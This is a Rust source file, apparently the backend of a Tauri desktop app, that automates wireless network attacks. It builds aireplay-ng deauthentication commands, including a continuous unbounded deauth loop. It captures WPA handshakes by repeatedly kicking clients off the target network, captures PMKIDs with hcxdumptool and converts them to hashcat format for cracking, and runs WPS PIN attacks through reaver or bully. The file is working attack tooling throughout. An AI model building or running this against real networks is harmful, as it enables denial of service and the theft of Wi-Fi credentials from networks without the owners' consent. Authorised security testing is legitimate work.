use std::sync::Arc;
use std::thread::JoinHandle;
use std::time::Duration;

use crate::model::{now, LogEvent};
use crate::process::{self, ChildGuard};
use crate::wifi;
use tauri::ipc::Channel;

fn report_result(result: Result<(), String>, logs: &Channel<LogEvent>) {
    if let Err(message) = result {
        let _ = logs.send(LogEvent {
            level: "error".into(),
            message,
            timestamp: now(),
        });
    }
}

fn ensure_linux(what: &str) -> Result<(), String> {
    if wifi::platform() != wifi::Platform::Linux {
        return Err(format!(
            "{what} requires Linux with a compatible wireless chipset."
        ));
    }
    Ok(())
}

fn linux_tool(tool: &str) -> Result<(), String> {
    if wifi::platform() != wifi::Platform::Linux {
        return Err("Packet injection requires Linux.".into());
    }
    wifi::require(tool)
}

/// Run a tool to completion, forwarding every output line to `logs`.
fn run_logged(program: &str, args: &[String], logs: &Channel<LogEvent>) -> Result<(), String> {
    let (tx, rx) = std::sync::mpsc::channel::<String>();
    let mut child = process::spawn_logged(program, args, tx).map_err(|e| e.to_string())?;
    let log_chan = logs.clone();
    let reader = std::thread::spawn(move || {
        while let Ok(line) = rx.recv() {
            let _ = log_chan.send(LogEvent {
                level: "info".into(),
                message: line,
                timestamp: now(),
            });
        }
    });
    let status = child.wait().map_err(|e| e.to_string())?;
    let _ = reader.join();
    if status.success() {
        Ok(())
    } else {
        Err(format!("{program} exited with {status}"))
    }
}

fn deauth_args(interface: &str, bssid: &str, client: Option<&str>, count: u32) -> Vec<String> {
    let mut args = vec![
        "--deauth".to_string(),
        count.to_string(),
        "-a".to_string(),
        bssid.to_string(),
    ];
    if let Some(c) = client {
        args.push("-c".to_string());
        args.push(c.to_string());
    }
    args.push(interface.to_string());
    args
}

/// Run a bounded deauth burst to completion, returning the combined output.
pub fn deauth_once(
    interface: &str,
    bssid: &str,
    client: Option<&str>,
    count: u32,
    logs: &Channel<LogEvent>,
) -> Result<(), String> {
    linux_tool("aireplay-ng")?;
    if count == 0 {
        return Err("Use continuous deauth for an unbounded attack.".into());
    }
    run_logged(
        "aireplay-ng",
        &deauth_args(interface, bssid, client, count),
        logs,
    )
}

/// Start a continuous deauth (count 0) in a worker thread, stoppable via the guard.
pub fn deauth_loop(
    interface: String,
    bssid: String,
    client: Option<String>,
    logs: Channel<LogEvent>,
) -> Result<(Arc<ChildGuard>, JoinHandle<()>), String> {
    linux_tool("aireplay-ng")?;
    let guard = ChildGuard::new();
    let guard2 = guard.clone();
    let handle = std::thread::spawn(move || {
        let args = deauth_args(&interface, &bssid, client.as_deref(), 0);
        report_result(
            run_until_stopped("aireplay-ng", &args, &logs, guard2),
            &logs,
        );
    });
    Ok((guard, handle))
}

/// Spawn a tool and stream it until `guard` requests a stop, then reap it.
fn run_until_stopped(
    program: &str,
    args: &[String],
    logs: &Channel<LogEvent>,
    guard: Arc<ChildGuard>,
) -> Result<(), String> {
    let (tx, rx) = std::sync::mpsc::channel::<String>();
    let mut child = process::spawn_logged(program, args, tx).map_err(|e| e.to_string())?;
    guard.set_pid(child.id());
    let log_chan = logs.clone();
    let reader = std::thread::spawn(move || {
        while let Ok(line) = rx.recv() {
            let _ = log_chan.send(LogEvent {
                level: "info".into(),
                message: line,
                timestamp: now(),
            });
        }
    });
    while !guard.stop_requested() {
        if let Some(status) = child.try_wait().map_err(|e| e.to_string())? {
            let _ = reader.join();
            if !status.success() {
                return Err(format!("{program} exited with {status}"));
            }
            return Ok(());
        }
        std::thread::sleep(Duration::from_millis(100));
    }
    process::reap(&mut child);
    let _ = reader.join();
    Ok(())
}

/// Capture a WPA handshake: targeted airodump plus periodic deauth bursts.
/// Completes when a handshake is seen or the guard is stopped.
pub fn capture_handshake(
    interface: String,
    bssid: String,
    channel: i32,
    prefix: String,
    logs: Channel<LogEvent>,
) -> Result<(Arc<ChildGuard>, JoinHandle<()>), String> {
    ensure_linux("Handshake capture")?;
    wifi::require("airodump-ng")?;
    wifi::require("aireplay-ng")?;

    let guard = ChildGuard::new();
    let guard2 = guard.clone();
    let handle = std::thread::spawn(move || {
        let errors = logs.clone();
        report_result(
            run_handshake(interface, bssid, channel, prefix, logs, guard2),
            &errors,
        );
    });
    Ok((guard, handle))
}

fn run_handshake(
    interface: String,
    bssid: String,
    channel: i32,
    prefix: String,
    logs: Channel<LogEvent>,
    guard: Arc<ChildGuard>,
) -> Result<(), String> {
    let mut args = vec![interface.clone()];
    args.push("--bssid".to_string());
    args.push(bssid.clone());
    args.push("--channel".to_string());
    args.push(channel.to_string());
    args.push("-w".to_string());
    args.push(prefix.clone());
    args.push("--write-interval".to_string());
    args.push("1".to_string());

    let (tx, rx) = std::sync::mpsc::channel::<String>();
    let mut child = process::spawn_logged("airodump-ng", &args, tx).map_err(|e| e.to_string())?;
    guard.set_pid(child.id());

    // Forward output, watching for the handshake notice.
    let handshake = Arc::new(std::sync::atomic::AtomicBool::new(false));
    let hs = handshake.clone();
    let log_chan = logs.clone();
    let reader = std::thread::spawn(move || {
        while let Ok(line) = rx.recv() {
            if line.contains("WPA handshake") {
                hs.store(true, std::sync::atomic::Ordering::SeqCst);
            }
            let _ = log_chan.send(LogEvent {
                level: "info".into(),
                message: line,
                timestamp: now(),
            });
        }
    });

    let cap_path = format!("{prefix}-01.cap");
    let mut attempts = 0u32;
    while !guard.stop_requested()
        && !handshake.load(std::sync::atomic::Ordering::SeqCst)
        && attempts < 40
    {
        // Kick a client to force a reconnection that exposes the handshake.
        let _ = deauth_once(&interface, &bssid, None, 5, &logs);
        attempts += 1;
        std::thread::sleep(Duration::from_secs(3));
    }

    process::reap(&mut child);
    let _ = reader.join();

    let captured = handshake.load(std::sync::atomic::Ordering::SeqCst);
    let _ = logs.send(LogEvent {
        level: if captured {
            "success".into()
        } else {
            "warn".into()
        },
        message: if captured {
            format!("Handshake captured: {cap_path}")
        } else {
            format!("Handshake capture stopped (no handshake confirmed): {cap_path}")
        },
        timestamp: now(),
    });
    Ok(())
}

/// Capture a PMKID via hcxdumptool (optional — requires hcxdumptool + hcxpcapngtool).
pub fn capture_pmkid(
    interface: String,
    bssid: String,
    channel: i32,
    prefix: String,
    logs: Channel<LogEvent>,
) -> Result<(Arc<ChildGuard>, JoinHandle<()>), String> {
    ensure_linux("PMKID capture")?;
    if process::which("hcxdumptool").is_none() {
        return Err("PMKID capture requires `hcxdumptool` (install hcxtools).".into());
    }
    let guard = ChildGuard::new();
    let guard2 = guard.clone();
    let pcapng = format!("{prefix}.pcapng");
    let handle = std::thread::spawn(move || {
        let args = vec![
            "-i".to_string(),
            interface,
            "-c".to_string(),
            channel.to_string(),
            "-o".to_string(),
            pcapng.clone(),
            "--enable_status=1".to_string(),
            "--filtermode=2".to_string(),
            "--filtermac".to_string(),
            bssid,
        ];
        report_result(
            run_until_stopped("hcxdumptool", &args, &logs, guard2),
            &logs,
        );
        // Convert to hashcat format if possible.
        if let Ok(out) = process::run(
            "hcxpcapngtool",
            &["-o", &format!("{prefix}.22000"), &pcapng],
        ) {
            let msg = String::from_utf8_lossy(&out.stdout).trim().to_string();
            let _ = logs.send(LogEvent {
                level: "info".into(),
                message: msg,
                timestamp: now(),
            });
        }
    });
    Ok((guard, handle))
}

/// Run a WPS attack via reaver (optional — requires reaver/bully).
pub fn wps_attack(
    interface: String,
    bssid: String,
    channel: i32,
    logs: Channel<LogEvent>,
) -> Result<(Arc<ChildGuard>, JoinHandle<()>), String> {
    ensure_linux("WPS attack")?;
    let tool = if process::which("reaver").is_some() {
        "reaver"
    } else if process::which("bully").is_some() {
        "bully"
    } else {
        return Err("WPS attack requires `reaver` or `bully`.".into());
    };
    let guard = ChildGuard::new();
    let guard2 = guard.clone();
    let handle = std::thread::spawn(move || {
        let args = if tool == "reaver" {
            vec![
                "-i".to_string(),
                interface,
                "-b".to_string(),
                bssid,
                "-c".to_string(),
                channel.to_string(),
                "-vv".to_string(),
            ]
        } else {
            vec![
                interface,
                "-b".to_string(),
                bssid,
                "-c".to_string(),
                channel.to_string(),
                "-vv".to_string(),
            ]
        };
        report_result(run_until_stopped(tool, &args, &logs, guard2), &logs);
    });
    Ok((guard, handle))
}
